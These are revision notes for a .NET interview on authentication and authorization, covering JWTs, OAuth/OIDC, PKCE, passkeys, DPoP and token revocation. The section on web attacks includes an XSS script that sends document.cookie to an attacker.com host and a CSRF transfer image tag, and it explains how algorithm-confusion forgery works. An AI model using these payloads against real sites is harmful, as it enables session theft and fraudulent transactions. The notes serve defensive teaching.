# Authentication & Authorization — Quick Revision Notes

> Quick-revision notes derived from the Senior .NET Auth Interview Guide. Covers every section and sub-topic in the same order — Core Concepts, Intermediate, Advanced, Security & Performance, Best Practices, Pitfalls, C# Reference, and Sample Q&A. Use for a fast brush-up; the guide is only needed for deeper prose.

---

## 1. Core Concepts

### 1.1 Authentication vs Authorization

| | Authentication | Authorization |
|---|---|---|
| Answers | Who are you? | What can you do? |
| Mechanism | Login (credentials/token/cert) | Claims/roles/policies vs a resource |
| ASP.NET middleware | `UseAuthentication()` → populates `HttpContext.User` | `UseAuthorization()` → evaluates `[Authorize]` |
| Failure | `401 Unauthorized` | `403 Forbidden` |

**Q: Why 401 when I expected 403?**
A: 401 = authentication handler never populated a valid principal (missing/invalid/expired token) — pipeline never reached the authorization stage. 403 = authenticated OK, but the policy/role check failed.

### 1.2 Stateful Sessions vs Stateless Tokens

- **Stateful (classic):** server stores `sessionId → userId, roles, expiry` (memory/Redis/DB); client holds only a random `sessionId` cookie. **Pro:** easy revocation, server owns truth. **Con:** must store/scale session state.
- **Stateless (JWT common format):** token carries claims; server verifies cryptographically, no storage. **Pro:** horizontally scalable, no central store. **Con:** revocation is harder.
- **Key nuance:** JWT is just one *format* used in the stateless approach — not a synonym for "stateless".

```mermaid
flowchart LR
    subgraph Stateful["Stateful Session"]
    A1[Client] -- sessionId cookie --> A2[Server]
    A2 -- lookup --> A3[(Session Store Redis/DB)]
    end
    subgraph Stateless["Stateless JWT"]
    B1[Client] -- JWT --> B2[Server]
    B2 -- verify signature no DB call --> B2
    end
```

### 1.3 Basic Authentication (Legacy)

Sends `username:password` Base64-encoded on **every** request:
```
Authorization: Basic dXNlcjpwYXNzd29yZA==
```
- **Pros:** trivial, universal; OK for legacy/internal system-to-system behind VPN.
- **Risks:** creds on every request; Base64 is *encoding, not encryption*; no expiry/revocation; replayable if TLS is downgraded/terminated untrusted.
- **Why HTTPS mandatory:** creds only encoded → trivially recoverable in transit without TLS.
- **Replay attack:** attacker captures a valid request/token and resends it later to gain access without knowing credentials. Bearer schemes without freshness checks are inherently vulnerable — mitigate with TLS + short-lived creds + nonces for sensitive ops.

### 1.4 What JWT Actually Is

JWT = compact, URL-safe string of JSON claims. Can be **Signed** (JWS, most common) or **Encrypted** (JWE). Part of the **JOSE** family:

| Spec | Meaning |
|---|---|
| JWS | Signed JWT |
| JWE | Encrypted JWT |
| JWK | Key representation format |
| JWA | Algorithm names (HS256, RS256…) |

- **Critical misconception:** a signed JWT is **not secret** — anyone can Base64URL-decode and read the payload. Signing gives **integrity** (can't alter without breaking signature) + **authenticity** (verify who issued it). It does **not** give confidentiality. For that: use JWE, keep sensitive data out, or use opaque tokens + introspection.
- **URL-safe = Base64URL:** `+`→`-`, `/`→`_`, padding dropped. Encoding ≠ security.

### 1.5 JWT Anatomy — Header, Payload, Signature

`xxxxx.yyyyy.zzzzz` — three Base64URL segments separated by dots.

```json
// Header
{ "alg": "RS256", "typ": "JWT", "kid": "key-2026-05" }
```
- `alg` = signing/encryption algorithm; `typ` = usually "JWT"; `kid` = which key from JWKS to use.

```json
// Payload (claims)
{ "iss": "https://auth.mycompany.com", "aud": "my-api", "sub": "user_123",
  "exp": 1760000000, "iat": 1759996400, "nbf": 1759996400,
  "scope": "orders:read orders:write", "role": "admin" }
```
- **Signature:** computed over `base64url(header) + "." + base64url(payload)` using `alg`. Verifying proves header+payload are exactly what the issuer signed.

### 1.6 Claims: Registered, Public, Private

| Registered claim | Meaning |
|---|---|
| `iss` | Issuer |
| `sub` | Subject (usually user id) |
| `aud` | Audience (intended API) |
| `exp` | Expiry (UNIX ts) |
| `iat` | Issued at |
| `nbf` | Not-before |
| `jti` | Unique token id (revocation lists) |

- **Public claims:** globally unique/collision-resistant names (often URIs).
- **Private claims:** your own fields — `employeeId`, `tenantId`, `Department`.

---

## 2. Intermediate

### 2.1 Signing Algorithms: HS256 vs RS256 vs ES256

- **HS256 (HMAC, symmetric):** one secret signs *and* verifies. Any verifier can also **mint** tokens → secret sprawl risk. Good for single authority/monolith.
- **RS256 (RSA, asymmetric):** private signs, public verifies. APIs only need public key → safe distribution via JWKS. Good for microservices/third-party.
- **ES256 (ECDSA, asymmetric):** same split, smaller keys/tokens, often faster; slightly more library/HSM friction.
- **Rule of thumb:** RS256/ES256 whenever >1 service verifies; HS256 only if you control every verifier and can protect the secret.

| | HS256 | RS256 | ES256 |
|---|---|---|---|
| Key | Symmetric | Asymmetric | Asymmetric |
| Verify | Anyone w/ secret (**can forge**) | Public key (can't forge) | Public key (can't forge) |
| Best for | Monolith | Microservices | Multi-service, size/perf sensitive |
| Distribution risk | High | Low | Low |

### 2.2 Where JWTs Live & Storage Trade-offs

Most common: `Authorization: Bearer <token>`. Alternative: HttpOnly Secure cookie (browsers).

| Storage | JS-readable? | XSS | CSRF | Notes |
|---|---|---|---|---|
| `localStorage` | Yes | High | None | Easiest, worst security |
| `sessionStorage` | Yes | High | None | Cleared on tab close; still XSS-vulnerable |
| HttpOnly cookie | No | Low | Yes (needs CSRF protection) | Best default for browser apps |

No perfect answer — depends on app type/threat model. SPA+API often prefer HttpOnly cookie + CSRF, or BFF pattern (§3.9) keeping tokens off the browser entirely.

### 2.3 Access Tokens vs Refresh Tokens

| Aspect | Access | Refresh |
|---|---|---|
| Purpose | Call APIs | Get new access token |
| Lifetime | Short (5–30 min) | Long (days/weeks) |
| Stored | Memory / short cookie | Secure (HttpOnly cookie, encrypted DB row) |
| Sent to API | Every request | Only to token endpoint |
| Revocable | Hard (stateless) | Easy (server record) |
| Risk if stolen | Limited (short window) | High unless rotation + reuse detection |
| Format | JWT | Usually **opaque** random string |

- **Why refresh tokens are opaque:** you want easy server-side revocation/rotation — an opaque string is just a lookup key into a record you control, no self-contained claims to go stale.

### 2.4 Full Login → API → Refresh Flow

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Auth Server
    participant API as Resource API
    C->>AS: POST /login (credentials)
    AS-->>C: Access Token (JWT) + Refresh Token (opaque)
    C->>API: GET /orders (Bearer access token)
    API->>API: Validate signature, iss, aud, exp
    API-->>C: 200 OK
    Note over C,API: access token expires
    C->>AS: POST /refresh (refresh token)
    AS->>AS: Validate + rotate refresh token
    AS-->>C: New Access + New Refresh (old invalidated)
```
Rotation = every refresh issues a new refresh token and invalidates the old → helps *detect* theft (§3.8).

### 2.5 JWT Validation — What Happens Internally

A correct verifier does far more than "check signature":
1. **Parse** header + payload (trust nothing yet).
2. **Select key safely:** RS256/ES256 → pick by `kid` from a **trusted pre-configured** JWKS. **Never** fetch keys from a URL the token points to (`jku`/`x5u` injection attack).
3. **Verify signature** with the algorithm *you* configured — never the token's own `alg` (§4.3).
4. **Validate claims:** `exp` future (small skew 1–2 min), `nbf` ≤ now, `iss` matches, `aud` includes your API.
5. **Authorize:** scopes/roles/permissions vs resource.
6. **Optional hardening:** `jti` vs revocation list; `tenantId` matches context; `typ`/`token_use` so a refresh token can't be replayed as access.

**Say out loud:** *signature proves the issuer created it; claims validation proves it's meant for me and still valid.* Both required. Validated claims → `HttpContext.User` (`ClaimsPrincipal`).

### 2.6 Claims vs Roles vs Policy-Based Authorization

- **Role:** grouping (`Admin`, `User`). **Claim:** key-value (`Department=Finance`). **Policy:** named, centrally-registered rule from claims/roles/custom logic.

| Feature | Role | Claims | Policy |
|---|---|---|---|
| Flexibility | Low | High | Highest |
| Scalability | Role explosion (`AdminForRegionX`…) | Scalable | Scalable + centralized |
| Logic lives | Scattered attributes | Scattered + manual checks | Centralized in `AddAuthorization()` |

```csharp
[Authorize(Roles = "Admin")]                          // Role-based
if (!User.HasClaim("Department", "IT")) return Forbid(); // Claims (ad hoc)

// Policy-based (centralized, reusable, testable)
builder.Services.AddAuthorization(o =>
    o.AddPolicy("ITOnly", p => p.RequireClaim("Department", "IT")));
[Authorize(Policy = "ITOnly")] public IActionResult InternalData() => Ok();
```
- **Why claims/policies scale better:** roles multiply combinatorially; claims express attributes independently and combine in policies; policies centralize decision logic (auditability).
- **Policy pitfall:** overly complex nested policies are hard to test/debug (failed policy → bare 403). Mitigate with custom `IAuthorizationHandler` that logs *why* it failed; keep policies small/composable.

### 2.7 The 7 ASP.NET Core Authorization Styles

1. **Simple** — `[Authorize]`, just requires authenticated user.
2. **Role-based** — `[Authorize(Roles = "Admin,Manager")]`; checks `ClaimTypes.Role`.
3. **Policy-based** — named policies via `[Authorize(Policy="...")]`; recommended default.
4. **Claims-based** — `RequireClaim(...)` in a policy or `User.HasClaim(...)`.
5. **Custom requirement-based** — `IAuthorizationRequirement` + `AuthorizationHandler<T>` for non-declarative logic.
6. **Endpoint-specific** — Minimal API `.RequireAuthorization("Policy")`; same engine, different syntax.
7. **Resource-based** — `IAuthorizationService.AuthorizeAsync(User, resource, policy)` when the decision needs the *specific object* (e.g. "can this user delete *this* document" → load it first). Reach for it when the rule depends on runtime data, not just the token.

```csharp
public class DocumentAuthHandler : AuthorizationHandler<SameAuthorRequirement, Document>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext ctx, SameAuthorRequirement req, Document doc)
    {
        if (doc.OwnerId == ctx.User.FindFirstValue(ClaimTypes.NameIdentifier))
            ctx.Succeed(req);
        return Task.CompletedTask;
    }
}
var result = await _authorizationService.AuthorizeAsync(User, document, "SameAuthorPolicy");
if (!result.Succeeded) return Forbid();
```

---

## 3. Advanced

### 3.1 OAuth 2.0 — Roles, Flows, Grant Types

OAuth 2.0 = **authorization framework** letting a user grant a third-party app access *without sharing credentials*. Not itself authentication (OIDC layers that on — §3.4).

**Four roles:** Resource Owner (user), Client (app), Authorization Server (issues tokens), Resource Server (the API).

**Authorization Code flow ("Login with Google"):**
1. User clicks login → app redirects to auth endpoint.
2. User authenticates + grants → redirect back with an **authorization code**.
3. App exchanges code for tokens server-to-server (client secret for confidential clients, or PKCE verifier for public).
4. App uses **access token** to call API.

```
GET https://accounts.google.com/o/oauth2/auth?client_id=...&redirect_uri=...&response_type=code&scope=email profile

POST https://oauth2.googleapis.com/token
client_id=...&client_secret=...&code=...&grant_type=authorization_code&redirect_uri=...
```
```json
{ "access_token":"ya29...", "expires_in":3600, "token_type":"Bearer", "refresh_token":"1//0g..." }
```

### 3.2 OAuth2 Grant Types: Which Are Deprecated/Unsafe

| Grant | Status | Use case | Why / why not |
|---|---|---|---|
| Authorization Code (+PKCE) | **Standard** | Web/SPA/mobile, user present | Code never exposes tokens in URL; PKCE protects exchange even for public clients |
| Client Credentials | **Standard** | M2M, no user | Client auths with own secret/cert |
| Refresh Token | **Standard** | Silent new access token | Always rotate (§3.8) |
| Device Code | **Standard** | TVs, CLIs | User auths on a 2nd device via short code |
| **Implicit** | **Deprecated** | Was: SPAs pre-PKCE | Token in URL fragment, no code exchange, in history/referrer, no refresh. Removed in OAuth 2.1 |
| **ROPC** (Password) | **Deprecated** | Was: trusted first-party | App handles raw creds; no MFA/federation. Removed in OAuth 2.1; only marginal for legacy migration |

- **Follow-up:** *If implicit is dead, how do SPAs get tokens?* → Authorization Code + PKCE (PKCE removes need for a secret while keeping secure code exchange).

### 3.3 PKCE — Why Mandatory Even for Confidential Clients

PKCE (RFC 7636) binds the auth code to the requesting client:
1. Client generates `code_verifier`, derives `code_challenge = BASE64URL(SHA256(verifier))`.
2. Auth request sends `code_challenge` + `code_challenge_method=S256`.
3. Server stores challenge with the code.
4. Token exchange sends original `code_verifier`.
5. Server recomputes hash, compares — mismatch → reject.

Defeats **authorization code interception** (malicious app registering same URI scheme, compromised network): attacker can't exchange without the verifier, which never leaves the client.

**Why now recommended for confidential clients too:** defense in depth (code can leak via history/referrer/logs); simpler universal rule ("always PKCE") → fewer misconfigs; cheap and composes with client secret/cert.

```mermaid
sequenceDiagram
    participant App as SPA (public client)
    participant AS as Authorization Server
    App->>App: Generate verifier, derive challenge (S256)
    App->>AS: Auth request + code_challenge
    AS->>App: Redirect with code
    App->>AS: Token request: code + code_verifier
    AS->>AS: Recompute SHA256, compare to stored challenge
    AS-->>App: Access + ID Token (+ Refresh if offline_access)
```

### 3.4 OAuth 2.0 vs OpenID Connect vs JWT

- **JWT** = token *format*. **OAuth 2.0** = authorization *framework*. **OIDC** = identity layer on OAuth 2.0 (adds **ID Token** [always JWT], `/userinfo`, login semantics).

| | OAuth 2.0 | JWT |
|---|---|---|
| Purpose | Authorization protocol | Token format |
| Contains user data? | No by itself | Yes (self-contained) |
| Requires call to validate? | Depends (introspection for opaque) | No — local crypto validation |
| Best for | Delegated access, SSO | Stateless auth payload |

**OIDC gives three tokens:** ID Token (who the user is → for the *client*, always JWT), Access Token (calls the *API*, JWT or opaque), Refresh Token (new tokens, usually opaque).

- **Most common mistake:** using the **ID token to call your API**. ID tokens are for the client to establish identity locally. APIs must validate **access tokens** whose `aud` is scoped to that API.

### 3.5 SAML vs OIDC for SSO/Federation

| | SAML 2.0 | OIDC |
|---|---|---|
| Format | XML signed assertions | JWT (JSON) |
| Transport | Redirects/POST, heavy XML | Compact URL-safe tokens |
| Use case | Enterprise SSO, legacy IdP (ADFS), B2B | Modern web/mobile/SPA, API-first |
| Mobile/SPA | Poor | Good (PKCE etc.) |
| Logout | SLO (fragile across providers) | RP-Initiated Logout (simpler, still edge cases) |
| Ergonomics | Verbose, XML-signature edge cases | JSON, JWKS key rotation, good libs |

- **"Would you introduce SAML for a new project?"** → No, only to integrate an existing IdP/partner that mandates it. Default new projects to OIDC. Bridge with an **identity broker** (Azure AD, Okta, Auth0, Keycloak) accepting SAML upstream and presenting OIDC downstream.

### 3.6 Azure AD (Entra ID) + Angular MSAL

**Flow:** Authorization Code + PKCE.
```
Angular App → Azure AD Login → (code + PKCE) → Azure AD issues Access/ID Token → Angular calls .NET API with Bearer
```
**Setup:** 1) Register app (redirect URI, SPA platform; save Client ID + Tenant ID). 2) API permissions (Graph `User.Read`, admin consent). 3) Optional: expose backend API (`api://<id>`, scope `access_as_user`). 4) `npm i @azure/msal-browser @azure/msal-angular`. 5) Configure MSAL (`clientId`/`tenantId`/`redirectUri`, cache `sessionStorage`, protected resource map). 6) `MsalGuard` on routes. 7) `loginRedirect()`/`logoutRedirect()`. 8) Call API with `HttpClient` (interceptor attaches token). 9) Secure .NET API with **Microsoft.Identity.Web** (`Instance`/`TenantId`/`ClientId`/`Audience`) — validates via OIDC metadata/JWKS.

- **Pitfalls:** wrong redirect URI; missing admin consent; over-broad scopes; CORS; deprecated implicit flow; token audience mismatch.
- **Best practices:** Auth Code + PKCE; let MSAL manage the cache (never manually store); HTTPS; least-privilege scopes; conditional access; monitor sign-in logs.

### 3.7 Okta PKCE + Refresh Token + .NET API

```typescript
const oktaAuth = new OktaAuth({
  issuer: 'https://YOUR_OKTA_DOMAIN/oauth2/default',
  clientId: 'YOUR_CLIENT_ID',
  redirectUri: window.location.origin + '/login/callback',
  scopes: ['openid', 'profile', 'email']
});
```
- `signInWithRedirect()` / `signOut()`; `getAccessToken()`; `HttpInterceptor` attaches Bearer automatically.

```mermaid
flowchart TD
    A[User login] --> B[Generate code_verifier] --> C[code_challenge] --> D[Redirect to Okta]
    D --> E[Authenticate] --> F[Auth Code] --> G[Send code + verifier]
    G --> H[Okta issues Access, ID, Refresh] --> I[Access token for API] --> J[Expires]
    J --> K[Refresh silently gets new access token]
```
```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o => { o.Authority = "https://dev-12345.okta.com/oauth2/default";
                         o.Audience = "api://default"; });
builder.Services.AddAuthorization();
```
- Setting `Authority` → middleware fetches OIDC discovery + JWKS, caches, rotates transparently (never hard-code keys).
- **`offline_access` scope** required to get a refresh token. **`autoRenew`** (okta-auth-js) refreshes before expiry.

### 3.8 Refresh Token Rotation & Reuse Detection

- **Rotation:** every use → new refresh token, old invalidated. Narrows the theft window but doesn't *detect* theft.
- **Reuse detection** (the real control):
  1. Used token marked **"consumed"** (not deleted).
  2. If a consumed token is presented again → strong theft signal (legit client only has the latest). Handle rare races with a short grace window.
  3. On reuse → **revoke the entire token family/session chain** → force full re-auth.

```mermaid
sequenceDiagram
    participant U as User
    participant A as Attacker (stole RT1)
    participant S as Auth Server
    U->>S: Refresh with RT1
    S->>S: Mark RT1 consumed, issue RT2
    S-->>U: New Access + RT2
    A->>S: Refresh with RT1 (already consumed)
    S->>S: Detect reuse → revoke whole family
    S-->>A: 401
```
- **Trade-off:** revoking the family logs out the legit user too — intentional "fail safe"; the alternative leaves the attacker's descendant token valid.
- Also: **bind refresh tokens to device/session metadata** (IP range, UA fingerprint) as a secondary signal + audit data.

### 3.9 Securing SPA-to-API: BFF vs Token-in-Browser

- **Token-in-browser:** token ultimately lives in the browser's reach (even in HttpOnly cookie — browser still issues/consumes it from the SPA's origin).
- **BFF (Backend-for-Frontend):** browser never sees an OAuth token.

```mermaid
flowchart LR
    Browser["Browser (SPA)"] -- "Session cookie only (HttpOnly, Secure, SameSite)" --> BFF["BFF (your backend)"]
    BFF -- "Auth Code + PKCE (server-to-server)" --> AS["Authorization Server"]
    BFF -- "Access token attached server-side" --> API["Resource API"]
```
- SPA ↔ BFF via plain session cookie; BFF is a confidential client doing the OAuth dance and attaching tokens to downstream calls. Removes the "where to store a token in the browser" problem entirely.

| | Token-in-browser | BFF |
|---|---|---|
| XSS blast radius | Can ride session or steal token (localStorage) | Can ride session cookie, never gets a portable bearer token |
| Complexity | Lower | Higher (extra backend) |
| Mobile/Postman | Natural (bearer header) | Different flow (native apps rarely need BFF) |
| Recommended by | — | OAuth 2.0 Browser-Based Apps BCP |

- **Framing:** dual cookie/header is a pragmatic ship-it solution, but a senior answer names BFF as the more defense-in-depth choice when you control SPA + backend.

### 3.10 ASP.NET Core Identity Customization

- **Custom `IdentityUser`:** `class AppUser : IdentityUser<Guid> { TenantId, DisplayName, IsActive }` + custom `IdentityDbContext<AppUser, AppRole, Guid>`.
- **Custom validators:** `IPasswordValidator<TUser>` / `IUserValidator<TUser>` for org policy.
- **Custom claims factory:** override `UserClaimsPrincipalFactory<TUser>` to inject claims (tenant, feature flags) at sign-in vs per-request.
- **Replace token provider:** use Identity only for user/credential mgmt (`SignInManager`/`UserManager`) and issue your own JWTs from a custom endpoint.
- **`AddIdentityCore` vs `AddIdentity`:** API-only backends want `AddIdentityCore` — skips cookie-auth/UI scaffolding; add JWT bearer on top.
- **Custom stores:** implement `IUserStore<TUser>` directly when users live externally (legacy DB, Azure AD) — rare but real.

```csharp
builder.Services.AddIdentityCore<AppUser>(o => {
        o.Password.RequiredLength = 12; o.User.RequireUniqueEmail = true; })
    .AddRoles<AppRole>().AddEntityFrameworkStores<AppDbContext>().AddDefaultTokenProviders();
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(/* ... */);
```
- **"Why not Identity's cookie auth for the API?"** → cookies are browser/session-oriented, don't serve mobile/service-to-service/third-party or scale statelessly. Identity = user/credential/role management; JWT = API auth.

### 3.11 Multi-Tenant Authentication & Authorization

1. **Where does tenant identity live?** As a token claim (`tenantId` — simplest, but changes need re-issue/version check) OR derived from request (subdomain/header/route) cross-checked against allowed tenants (flexible, adds a lookup).
2. **Single vs per-tenant IdP:** shared IdP + tenant claim (B2C SaaS) OR per-tenant IdP (each customer brings own Azure AD/Okta) → needs **dynamic issuer validation** (`ValidIssuers` or custom `IssuerValidator`).
3. **Cross-tenant leakage is the #1 bug:** scope every query by tenant; don't trust the JWT claim alone — enforce at the data layer (EF Core global query filters).
4. **`aud`/`iss` per tenant:** app-per-tenant models need tenant-aware validation, not a static string.

```csharp
options.TokenValidationParameters = new TokenValidationParameters {
    ValidateIssuer = true,
    IssuerValidator = (issuer, token, parameters) =>
        _tenantIssuerResolver.IsKnownIssuer(issuer) ? issuer
            : throw new SecurityTokenInvalidIssuerException("Unknown tenant issuer"),
    ValidateAudience = true
};
```
- **Framing:** the hard part isn't token validation — it's enforcing tenant scoping *consistently* at every layer (claim → middleware → data). One missed filter = cross-tenant leak.

### 3.12 WebAuthn / FIDO2 / Passkeys

**Core idea — no shared secret to steal.** Unlike passwords/OTP (shared secrets), WebAuthn uses **asymmetric key pairs generated per device, per site**:
- On registration the authenticator (Windows Hello/Touch ID, or hardware key) generates a **new key pair scoped to the origin**.
- **Private key never leaves the authenticator** (secure enclave/TPM, non-exportable).
- **Public key stored by the server** with a `credentialId`. Different site → entirely different key pair; nothing reusable.

**Why phishing-resistant (vs OTP):** a WebAuthn credential is **cryptographically bound to the origin by the browser/OS**, not the user's judgment. The browser includes the real origin in the signed data; the authenticator only signs for the registered origin. A phishing site at a different origin can't get a valid assertion — the user never types anything secret. OTP still relies on the user identifying the real site → defeated by real-time phishing/AITM proxies.

**Ceremonies:**
1. **Registration (attestation):** server sends random challenge + RP info → browser `navigator.credentials.create()` → authenticator generates key pair, signs challenge → server verifies + **stores public key + credentialId**.
2. **Authentication (assertion):** server sends challenge (scoped to registered credentialIds) → `navigator.credentials.get()` → local gesture (biometric/PIN/tap) → authenticator **signs challenge with stored private key** → server verifies against stored public key.

```mermaid
sequenceDiagram
    participant U as User
    participant B as Browser/Authenticator
    participant S as Server (Relying Party)
    B->>S: Request login challenge
    S-->>B: Challenge + allowed credentialId(s)
    B->>U: Prompt local gesture
    U->>B: Approve (local only)
    B->>B: Sign challenge w/ device-bound private key
    B->>S: Signed assertion + credentialId
    S->>S: Look up public key, verify signature
    S-->>B: Authenticated (issue session/JWT)
```

**ASP.NET Core:** Identity has been adding native passkey/WebAuthn support (verify against your .NET version); long-standing community option is **`Fido2NetLib`** (server-side ceremonies). Your server = Relying Party, storing public keys + credential IDs (not passwords), issuing your normal session/JWT after the ceremony — WebAuthn replaces the *credential-verification* step only.
- **"Does this replace MFA?"** → often inherently multi-factor (something you have = the bound device + something you are/know = the biometric/PIN). Many orgs treat a passkey as satisfying MFA, but policy varies — it's a posture decision, not a technical requirement.

### 3.13 DPoP (RFC 9449 — Demonstrating Proof of Possession)

**Problem:** all access tokens (JWT or opaque) are **bearer tokens** — whoever holds it can use it; a stolen token replays from any IP/device and the server can't tell. This is why revocation + short expiry matter (detection/response, not prevention).

**How DPoP binds a token to a client:**
1. Client generates its own **key pair** (local, non-extractable; never sent).
2. For **every** request it creates a **DPoP proof** (short-lived JWT with HTTP method, URL, timestamp, `jti`) signed with its private key.
3. At token request, the auth server captures a **hash of the client's public key** and embeds it in the access token (`cnf.jkt` — JWK thumbprint).
4. Every API call sends access token + fresh DPoP proof (`Authorization: DPoP <token>` + `DPoP` header).
5. Resource server verifies **both**: proof signature matches method/URL/recency **and** the proof's public-key hash matches the token's `cnf.jkt`.

A stolen token alone is useless — without the private key the attacker can't produce a valid proof.

| | Plain Bearer | DPoP-Bound |
|---|---|---|
| Per request | Just token | Token + fresh signed DPoP proof |
| Thief needs | Just the token | Token **and** client's private key (never transmitted) |
| Server check | Token sig/iss/aud/exp | + proof sig + public-key-hash match |
| Infra | Standard OAuth | Client key gen/storage + per-request proof; server proof verify + `jti` replay cache |

```
// DPoP proof header: { "typ":"dpop+jwt", "alg":"ES256", "jwk":{...public key...} }
// Payload: { "jti":"...", "htm":"GET", "htu":"https://api.example.com/orders", "iat":1730000000 }
// RS verifies proof sig vs embedded jwk, then SHA256(jwk) == token's cnf.jkt
```
- **DPoP vs mTLS:** mTLS = transport-layer PoP via X.509 certs (strong, but needs CA/rotation/mesh). DPoP = application-layer PoP via app JWTs + client-generated keys — no CA/cert lifecycle → practical for SPAs/mobile. Trade-off: DPoP protects the *token* not the *transport*, adds per-request overhead + a replay cache. mTLS suits service-to-service with cert infra; DPoP suits public clients where token theft is the threat.
- **"If tokens are short-lived, why DPoP?"** → short expiry limits the *window* but a stolen 5-min token is fully usable within it. DPoP is complementary — makes the token worthless without the private key regardless of lifetime.

---

## 4. Security & Performance

### 4.1 Why JWT Revocation Is Hard — Real Strategies

A JWT is self-contained and unchecked against server state → valid until `exp` even after logout/deactivation/theft.
- **A) Very short access lifetime (5–15 min)** — most common, usually enough. Revoke the *refresh* token, wait out the window.
- **B) Blacklist by `jti`** — store revoked ids until natural expiry; check per request. Reintroduces state — use for high-value/immediate-termination.
- **C) Token versioning** — DB `userTokenVersion` + `ver` claim, reject on mismatch. Needs a check per request.
- **D) Opaque + introspection** — random string, API calls auth server every use. Fully revocable, adds a network hop (§4.2).
- **One-liner:** short expiry, refresh revocation, `jti` blacklist, or key rotation — no free lunch; each trades away statelessness.

### 4.2 Opaque Tokens vs JWT for Revocation — the Real Trade-off

| | JWT (self-contained) | Opaque + introspection |
|---|---|---|
| Revocation | Hard (needs added state) | Trivial (flag record → next introspect fails) |
| Per-request cost | Zero network (pure crypto) | One call to auth server (unless cached) |
| Scalability | Excellent (independent verify) | Bounded by introspection endpoint; mitigate w/ short-TTL cache |
| Info disclosure | Payload readable (unless JWE) | Nothing (meaningless outside issuer) |
| Offline verify | Possible | Not possible |
| Typical | Access tokens in high-volume microservices | Refresh tokens always; access when immediate revocation matters (banking) |

- **Senior framing:** it's a **latency vs revocability** trade-off, not a binary tech choice. Need instant revocation → opaque + introspection (or JWT + mandatory blacklist). Optimize throughput/scale (5–15 min exposure OK) → pure JWT. Common hybrid: JWT access (fast, short) + opaque refresh (revocable, long).

### 4.3 JWT Validation Pitfalls: Algorithm Confusion & alg:none

- **`alg: none`:** spec allows "unsigned" tokens. A naive verifier that trusts the token's `alg` accepts a signature-stripped token. **Fix:** pin expected algorithm(s) server-side (`ValidAlgorithms`), reject `none` unconditionally.
- **Algorithm confusion (RS256→HS256):** if a server verifies RS256 with a public key but the library will also verify HS256, an attacker: (1) takes the public RSA key (public via JWKS), (2) crafts `alg: HS256` using the **public key bytes as the HMAC secret**, (3) misconfigured server computes HMAC with a "secret" the attacker also has → forged signature verifies. **Fix:** fix expected algorithm + family server-side, never share key material between symmetric/asymmetric paths.

```csharp
options.TokenValidationParameters = new TokenValidationParameters {
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey,                          // RSA public key
    ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }, // pin — reject HS256/none
    ValidateIssuer = true, ValidateAudience = true, ValidateLifetime = true,
    ClockSkew = TimeSpan.FromMinutes(2)
};
```
- **"Detect in code review?"** → any code reading the algorithm from the token to decide how to verify; one key object used for both HMAC + RSA; any explicit disabling of algorithm validation.

### 4.4 CSRF, XSS, and Session Fixation

- **XSS:** attacker injects JS into a trusted site → runs in the victim's browser context, steals tokens/acts as them.
  ```html
  <script>fetch("https://attacker.com/steal?cookie=" + document.cookie);</script>
  ```
- **CSRF:** malicious site tricks a logged-in browser into a request to a trusted site; browser auto-attaches cookies → looks legitimate.
  ```html
  <img src="https://bank.com/transfer?to=attacker&amount=10000" />
  ```

| Storage | XSS | CSRF | Mitigation |
|---|---|---|---|
| local/sessionStorage | High (JS-readable) | None | Strong CSP, no unsanitized HTML |
| HttpOnly cookie | Low | Present | `SameSite=Strict/Lax` or `SameSite=None; Secure` + CSRF/anti-forgery tokens |

- **Session fixation:** attacker forces a *known* session id onto a victim before login (link with pre-set id, server accepting ids from URL). If the server doesn't issue a **fresh** id after login, the attacker rides the now-authenticated session. **Mitigation:** regenerate session id / issue new token immediately after login; never accept session id via URL; server-generated, random, HttpOnly.
- **Synthesis:** XSS attacks *storage*, CSRF attacks *ambient cookie trust*, fixation attacks the *session lifecycle*. Need one mitigation each: CSP/sanitization; SameSite + anti-forgery; token regeneration on privilege change. HttpOnly alone solves token theft but reintroduces CSRF.

### 4.5 mTLS for Service-to-Service Auth

- **mTLS:** normal TLS = only server presents a cert; mTLS = **client also presents a cert** and server verifies it → both sides authenticate during the handshake, before any app request/token.
- **Why:** authenticates the *calling service* at transport layer, independent of bearer tokens — zero-trust internal networks / service mesh (Istio/Linkerd).
- **Trade-offs vs bearer tokens:** certs need issuance/rotation infra (mesh sidecar handles it); mTLS authenticates *the service*, not fine-grained scopes → still layer OAuth client credentials for authorization. **Common combo: mTLS (transport identity) + OAuth client credentials JWT (authorization).**
- **.NET:** Kestrel supports client cert validation (`RequireCertificate`/`AllowCertificate`); production usually delegates handshake/rotation to a mesh or gateway.

### 4.6 API Keys vs OAuth Client Credentials (M2M)

| | API Key | OAuth Client Credentials |
|---|---|---|
| Proves | "Caller has this static secret" | "Caller is a registered client, got a scoped time-limited token" |
| Expiry | Usually none | Built-in (short-lived) |
| Scoping | All-or-nothing (unless custom) | Native scopes |
| Revocation | Manual rotate | Revoke client/token; short expiry helps |
| Standard | Bespoke | RFC 6749 |
| Simplicity | Very simple | More moving parts (token endpoint, JWKS, expiry) |
| Best for | Low-risk, quick onboarding, identification/rate-limit | Real security, auditability, scoped least-privilege |

- **Framing:** API keys = *identification* (who's calling), not real *authorization*. Fine for low-stakes; for anything security-sensitive use OAuth Client Credentials (private-key JWT or secret, short tokens, scopes) — the cloud default (Azure AD app registrations, Auth0 M2M).

### 4.7 Performance Considerations

- **JWT avoids a DB/session lookup per request** — its core win, but not free: RS256/ES256 verify is more CPU than HS256, and every revocation mitigation (blacklist/versioning/introspection) reintroduces I/O.
- **Large payloads** add network overhead per request — keep claims minimal, fetch rare detail from an API.
- **JWKS caching:** cache the JWKS (respect `Cache-Control`); libraries do this when `Authority` is set — know it's happening/tunable.
- **Introspection calls** are the biggest latency cost of opaque tokens — mitigate with short-TTL result caching (trading revocation immediacy).
- **Clock skew** small (1–2 min): too generous extends expired-token validity; too strict causes spurious failures from drift.

---

## 5. Best Practices

- **Never put secrets in a JWT** (no passwords/financial/PII — assume logs leak plaintext).
- **Keep access tokens short-lived** (minutes).
- **Always validate `iss`/`aud`/`exp`/`nbf`** — skipping `aud` enables replay across services sharing an issuer.
- **Asymmetric signing (RS256/ES256) when multiple services validate.**
